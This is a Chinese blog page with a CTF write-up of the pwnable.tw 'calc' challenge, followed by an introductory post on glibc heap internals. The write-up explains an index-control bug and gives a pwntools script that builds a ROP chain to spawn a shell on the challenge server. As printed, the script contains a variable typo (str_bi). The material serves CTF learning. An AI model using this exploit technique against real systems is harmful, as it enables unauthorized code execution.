              <time title="创建时间：2022-04-14 14:54:20" itemprop="dateCreated datePublished" datetime="2022-04-14T14:54:20+08:00">2022-04-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-04-15 15:35:11" itemprop="dateModified" datetime="2022-04-15T15:35:11+08:00">2022-04-15</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>感觉这题主要考察代码审计能力，比起其他套路化的pwn题，这题的漏洞和利用要难找许多</p>
<p>main函数如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ssignal(<span class="number">14</span>, timeout);</span><br><span class="line">  alarm(<span class="number">60</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;=== Welcome to SECPROG calculator ===&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  calc();</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Merry Christmas!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没什么需要关注的点，前面部分只是设置了个超时的处理，同时在puts()的输出中我们可以直到这个程序实现的应该是一个计算器的功能。</p>
<p>calc()函数才是程序主逻辑的开始：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">calc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> a2[<span class="number">101</span>]; <span class="comment">// [esp+18h] [ebp-5A0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">1024</span>]; <span class="comment">// [esp+1ACh] [ebp-40Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+5ACh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    bzero(s, <span class="number">0x400</span>u);                           <span class="comment">// 将s数组置零</span></span><br><span class="line">    <span class="keyword">if</span> ( !get_expr(s, <span class="number">0x400</span>) )                  <span class="comment">// 过滤输入，限制在 +-/*% 0-9 之间</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    init_pool(a2);                              <span class="comment">// a2数组置零</span></span><br><span class="line">    <span class="keyword">if</span> ( parse_expr(s, a2) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a2[a2[<span class="number">0</span>]]);                <span class="comment">// 输出结果，数组长度放在数组头，运算结果放在数组尾</span></span><br><span class="line">      fflush(<span class="built_in">stdout</span>);                           <span class="comment">// 如果能够控制a2[0]，就能任意地址读</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序在 get_expr() 函数中获取要计算的表达式，并将该表达式存放在s[]数组中，而且输入的最长长度为0x400，所以没有发生溢出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">get_expr</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+1Bh] [ebp-Dh] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v5 &lt; a2 &amp;&amp; read(<span class="number">0</span>, &amp;v4, <span class="number">1</span>) != <span class="number">-1</span> &amp;&amp; v4 != <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="string">&#x27;+&#x27;</span> || v4 == <span class="string">&#x27;-&#x27;</span> || v4 == <span class="string">&#x27;*&#x27;</span> || v4 == <span class="string">&#x27;/&#x27;</span> || v4 == <span class="string">&#x27;%&#x27;</span> || v4 &gt; <span class="string">&#x27;/&#x27;</span> &amp;&amp; v4 &lt;= <span class="string">&#x27;9&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = v5++;</span><br><span class="line">      a1[v2] = v4;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  a1[v5] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时 get_expr() 函数过滤了除运算符以及数字0-9之外的任何输入</p>
<p>程序的重点在  parse_expr() 函数内，该函数接收 s[] 和 a2[] 数组作为参数，该函数内部完成了对输入的表达式的解析以及调用 eval() 函数完成表达式的计算</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">parse_expr</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">int</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> count; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> lenth; <span class="comment">// [esp+2Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *number; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> num; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v4 = a1;                                      <span class="comment">// v4为数组头</span></span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  bzero(s, <span class="number">0x64</span>u);                              <span class="comment">// 将s数组置零</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;                                             <span class="comment">// 遍历这个表达式，直到遇到运算符</span></span><br><span class="line">    <span class="keyword">if</span> ( a1[i] - <span class="string">&#x27;0&#x27;</span> &gt; <span class="number">9</span> )                      <span class="comment">// 如果a[i]是运算符则进入这个if内</span></span><br><span class="line">    &#123;</span><br><span class="line">      lenth = &amp;a1[i] - v4;                      <span class="comment">// lenth == i</span></span><br><span class="line">      number = <span class="built_in">malloc</span>(lenth + <span class="number">1</span>);</span><br><span class="line">      <span class="built_in">memcpy</span>(number, v4, lenth);                <span class="comment">// 将当前包含运算符的表达式拷贝到number[]中</span></span><br><span class="line">      *(number + lenth) = <span class="number">0</span>;                    <span class="comment">// 将运算符改成结束符</span></span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(number, <span class="string">&quot;0&quot;</span>) )               <span class="comment">// 表达式中的数字是0则报错</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;prevent division by zero&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      num = atoi(number);                       <span class="comment">// 字符串转数字</span></span><br><span class="line">      <span class="keyword">if</span> ( num &gt; <span class="number">0</span> )                            <span class="comment">// 如果表达式的第一个字符是运算符，v9 == 0，这个if进不去</span></span><br><span class="line">      &#123;</span><br><span class="line">        count = (*a2)++;                        <span class="comment">// 数组a2的数组头保存当前记录的数字的个数</span></span><br><span class="line">        a2[count + <span class="number">1</span>] = num;                    <span class="comment">// 从a2[1]开始保存每个数字</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( a1[i] &amp;&amp; a1[i + <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span> &gt; <span class="number">9</span> )       <span class="comment">// 检查表达式中是否有0或者连续的运算符</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;expression error!&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v4 = &amp;a1[i + <span class="number">1</span>];                          <span class="comment">// 更新v4</span></span><br><span class="line">      <span class="keyword">if</span> ( s[v6] )                              <span class="comment">// 当次循环的时候，s[v6]保存的是前一个运算符，a1[i]保存的是当前记录的运算符</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">switch</span> ( a1[i] )                        <span class="comment">// 根据当前运算符进行switch</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;%&#x27;</span>:                             <span class="comment">// 如果当前运算符是%、*、/</span></span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> ( s[v6] != <span class="string">&#x27;+&#x27;</span> &amp;&amp; s[v6] != <span class="string">&#x27;-&#x27;</span> ) <span class="comment">// 且前一个运算符不为+或者-，则说明前一个运算符的优先级不大于当前运算符，则goto LABEL_14</span></span><br><span class="line">              <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">            s[++v6] = a1[i];                    <span class="comment">// 如果前一个运算符为+或者-，则意味着当前运算符的优先级大于前一个运算符，则直接保存到s[v6]数组中</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">LABEL_14:</span><br><span class="line">            eval(a2, s[v6]);                    <span class="comment">// 进去这里的情况是前一个记录的运算符的优先级不小于这次记录的运算符，这种情况选择直接用前一个运算符来算出那部分的结果</span></span><br><span class="line">            s[v6] = a1[i];                      <span class="comment">// 然后把这次记录的运算符保存在s[v6]，在下次循环中以此类推</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:								<span class="comment">// default对应a1[i]读到结束符的情况，这种情况表示整个表达式以及读完，程序开始从右往左开始计算</span></span><br><span class="line">            eval(a2, s[v6--]);</span><br><span class="line">            <span class="keyword">break</span>;                              <span class="comment">// 这一整块if和switch实现的是根据这次记录的运算符和前一个运算符之间优先级来进行不同的操作：</span></span><br><span class="line">        &#125;                                       <span class="comment">// 如果这一次记录的运算符的优先级不小于前一个运算符的话，则直接保存到s[++v6]中。相反如果前一个运算符的优先级不小于当前记录的运算符的话，则直接把前一个运算符的式子先算出来</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        s[v6] = a1[i];                          <span class="comment">// a1[i]是运算符，给到s[v6]</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !a1[i] )                             <span class="comment">// 检测到结束符break</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v6 &gt;= <span class="number">0</span> )                             <span class="comment">// 实现将表达式从右到左依次计算完成</span></span><br><span class="line">    eval(a2, s[v6--]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数的功能如上标注</p>
<p>跟进到 eval() 函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *__cdecl <span class="title">eval</span><span class="params">(_DWORD *a1, <span class="keyword">char</span> symbol)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( symbol == <span class="string">&#x27;+&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    a1[*a1 - <span class="number">1</span>] += a1[*a1];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( symbol &gt; <span class="string">&#x27;+&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( symbol == <span class="string">&#x27;-&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[*a1 - <span class="number">1</span>] -= a1[*a1];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( symbol == <span class="string">&#x27;/&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[*a1 - <span class="number">1</span>] /= a1[*a1];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( symbol == <span class="string">&#x27;*&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    a1[*a1 - <span class="number">1</span>] *= a1[*a1];</span><br><span class="line">  &#125;</span><br><span class="line">  result = a1;</span><br><span class="line">  --*a1;                                        <span class="comment">// --a2[0]</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>整个程序的逻辑需要一定时间去理解，理解了之后就会发现最重要的一个洞在于如果输入的第一个字符是运算符的话会导致a2[0]是能被我们控制的，进而在 calc() 函数中的 printf() 中就相当于控制了其打印的内容，从而完成任意地址泄漏。</p>
<p>更进一步，例如在表达式中输入 <code>+360+370</code> 这样的数据，在 parse_expr() 中这段表达式会形成三次循环，loop1中运算符‘+’被保存在 s[v6] 中，loop2之后 a2[0] == 360 （按程序逻辑走一遍就知道了），这是在loop3中就会先将 ‘370’ 赋值给a2[361]，然后在 eval() 中执行 a2[360] = a2[360] + a2[361]，也就是相当于让 a2[360] 自增了 ‘370’，而且因为a2[]是在栈上的，所以我们就相当于有了控制栈上数据的能力。</p>
<p>比如一个栈上的数据是 0xdeadbeef ，我们想要将这个数据修改成 0x11223344（只是例子），那么我们首先将这个栈上的数据泄漏出来，然后用上面说的一样的方法，输入“这个数据的相反数+想要修改成的数据”就可以了，具体的看exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./calc&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10100</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">pop_eax = <span class="number">0x0805c34b</span></span><br><span class="line">pop_ecx_ebx = <span class="number">0x080701d1</span></span><br><span class="line">pop_edx = <span class="number">0x080701aa</span></span><br><span class="line">int_80 = <span class="number">0x08049a21</span></span><br><span class="line">str_bin = <span class="number">0x6e69622f</span></span><br><span class="line">str_sh = <span class="number">0x68732f</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *0x8049411&quot;)</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;+360&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">stack_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>))</span><br><span class="line">binsh = stack_addr+<span class="number">4</span></span><br><span class="line">stack_addr = (stack_addr&amp;<span class="number">0xffffffff</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">offset,value</span>):</span></span><br><span class="line">	p.recv(timeout = <span class="number">1</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;+&#x27;</span> + <span class="built_in">str</span>(offset))</span><br><span class="line">	a = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>))</span><br><span class="line">	b = -a+value</span><br><span class="line">	<span class="keyword">if</span> b &lt; <span class="number">0</span>:</span><br><span class="line">		payload = <span class="string">&#x27;+&#x27;</span> + <span class="built_in">str</span>(offset) + <span class="built_in">str</span>(b)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		payload = <span class="string">&#x27;+&#x27;</span> + <span class="built_in">str</span>(offset) + <span class="string">&#x27;+&#x27;</span> + <span class="built_in">str</span>(b)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write(<span class="number">361</span>,pop_eax)</span><br><span class="line">write(<span class="number">362</span>,<span class="number">11</span>)</span><br><span class="line">write(<span class="number">363</span>,pop_ecx_ebx)</span><br><span class="line">write(<span class="number">364</span>,<span class="number">0</span>)</span><br><span class="line">write(<span class="number">365</span>,binsh)</span><br><span class="line">write(<span class="number">366</span>,pop_edx)</span><br><span class="line">write(<span class="number">367</span>,<span class="number">0</span>)</span><br><span class="line">write(<span class="number">368</span>,int_80)</span><br><span class="line">write(<span class="number">369</span>,str_bi)</span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *0x8049411&quot;)</span></span><br><span class="line">write(<span class="number">370</span>,str_sh)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/" class="post-title-link" itemprop="url">堆相关</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-03-19 16:48:28" itemprop="dateCreated datePublished" datetime="2022-03-19T16:48:28+08:00">2022-03-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-04-20 11:13:57" itemprop="dateModified" datetime="2022-04-20T11:13:57+08:00">2022-04-20</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="不错的文章"><a href="#不错的文章" class="headerlink" title="不错的文章"></a>不错的文章</h4><p><a target="_blank" rel="noopener" href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/">Understanding glibc malloc – sploitF-U-N (wordpress.com)</a></p>
<h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p>堆是存在于程序虚拟地址空间中的一块连续的线性区域，其提供动态分配内存，允许程序申请大小未知的内存。</p>
<p>堆的位置可以是紧贴数据段的上方，也可以是mmap中的某个位置</p>
<h2 id="堆管理器"><a href="#堆管理器" class="headerlink" title="堆管理器"></a>堆管理器</h2><p>堆管理器在用户与操作系统之间作为动态内存管理的中间人，其响应用户申请内存的请求，并向操作系统申请内存，然后将其返回给用户程序。同时其管理用户所释放的内存，适时归还给操作系统。</p>
<p>堆管理器并非由操作系统实现，而是<strong>由libc.so.6链接库</strong>实现，也就是说这段实现的代码存在于libc库中。其中封装了一些系统调用，为用户提供方便的动态内存分配接口的同时，力求高效的管理由系统调用申请来的内存。</p>
<p>不同操作系统的堆管理器也是不一样的</p>
<ul>
<li>dlmalloc - General purpose allocator</li>
<li><strong>ptmalloc2 - glibc</strong></li>
<li>jemalloc - FreeBSD and Firefox</li>
<li>tcmalloc - Google</li>
<li>libumen - Solaris</li>
</ul>
<p>申请内存的系统调用：</p>
<ul>
<li>brk</li>
<li>mmap（memory map - 内存映射）</li>
</ul>
<p>brk系统调用获取内存的方式就是从数据段的末尾（也就是data段的末尾）向上拓展一块空间，这块拓展出来的空间就属于heap段了，每执行一次brk系统调用，就把这块拓展的空间拓展得再大一些，使得堆内存不断地增长。</p>
<p>mmap系统调用用于向操作系统申请一大块内存空间，这块申请得到的空间放在mmap段的某个位置。对于每一块新的内存申请，先在物理内存中开辟其空间，然后再映射到虚拟内存中。</p>
<p>获取堆空间的这两种方式主要由两个要素决定：</p>
<p>主线程可以用brk也可以用mmap，子线程只能用mmap。其次主线程如果申请的内存区域过大的话，会直接用mmap在mmap段得到一块大的空间，如果申请的比较小的话，那么会使用brk直接在数据段上方拓展一块空间。</p>
<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/%E7%9F%A5%E8%AF%86%E7%82%B9-1.png" class>

<p>如上图，程序通过malloc向堆管理器申请内存，堆管理器通过系统调用（brk或mmap）向操作系统申请内存。</p>
<h2 id="堆管理器是如何工作的"><a href="#堆管理器是如何工作的" class="headerlink" title="堆管理器是如何工作的"></a>堆管理器是如何工作的</h2><p>首先需要知道三个关键词</p>
<ul>
<li>arena</li>
<li>chunk</li>
<li>bin</li>
</ul>
<h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h3><blockquote>
<p>在 Linux 的早期，dlmalloc 被用作默认的内存分配器。但后来由于ptmalloc2的线程支持，它成为linux的默认内存分配器。线程支持有助于提高内存分配器性能，从而提高应用程序性能。在dlmalloc中，当两个线程同时调用malloc时，只有一个线程可以进入关键部分，因为freelist数据结构在所有可用线程之间共享。因此，在多线程应用程序中，内存分配需要时间，从而导致性能下降。在 ptmalloc2 中，当两个线程同时调用 malloc 时，会立即分配内存，因为每个线程维护一个单独的堆段，因此维护这些堆的自由列表数据结构（也就是glibc中的bins）也是独立的。为每个线程维护单独的堆和 freelist 数据结构的这种行为称为 <strong>per thread arena</strong></p>
</blockquote>
<p>arena称为内存分配区，可以理解为堆管理器所持有的内存池。堆管理器与用户的内存交易发生在arena中。</p>
<blockquote>
<p>操作系统 –&gt; 堆管理器 –&gt; 用户</p>
<p>物理内存 –&gt; arena –&gt; 可用内存</p>
</blockquote>
<p>例如主个线程在data段上方申请了堆这样一个段，那么在堆段中就会将申请得到的内存组合形成一个arena，这个arena分配区会有一个对应的控制结构来描述这个分配区的相关信息</p>
<p>一个进程可以有多个arena，因为一个进程可以由多个线程构成，当线程较少的时候，arena与每个线程具有一对一映射，但是线程数量超过某个数量（与系统存在的内核数有关）时，glibc malloc在所有可用线程之间共享多个arena（这里涉及到arena上锁的知识，但是好像不重要）。</p>
<p>arena里有一段控制结构，叫<code>malloc _state</code>，该结构的细节如下：</p>
<p><strong>main arena</strong> <strong>的</strong> <strong>malloc_state</strong> <strong>并不是</strong> <strong>heap segment</strong> <strong>的一部分，而是一个全局变量，存储在</strong> <strong>libc.so</strong> <strong>的数据段</strong></p>
